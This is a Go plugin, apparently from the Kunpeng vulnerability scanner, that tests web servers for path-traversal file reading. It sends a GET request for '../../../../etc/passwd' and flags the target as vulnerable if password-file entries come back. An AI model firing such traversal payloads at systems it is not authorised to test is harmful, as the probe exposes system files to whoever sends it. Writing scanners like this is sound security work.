package goplugin

import (
	"net/http"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type webServerLFI struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("web", &webServerLFI{})
}
func (d *webServerLFI) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "WebServer 任意文件读取",
		Remarks: "web容器对请求处理不当，可能导致可以任意文件读取(例：GET ../../../../../etc/passwd)",
		Level:   1,
		Type:    "LFR",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://www.secpulse.com/archives/4276.html",
			KPID: "KP-0025",
		},
	}
	return d.info
}
func (d *webServerLFI) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}
func (d *webServerLFI) Check(URL string, meta plugin.TaskMeta) bool {
	if meta.System == "windows" {
		return false
	}
	request, err := http.NewRequest("GET", URL+"/../../../../../../../../etc/passwd", nil)
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "root:") && strings.Contains(resp.ResponseRaw, "nobody:") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
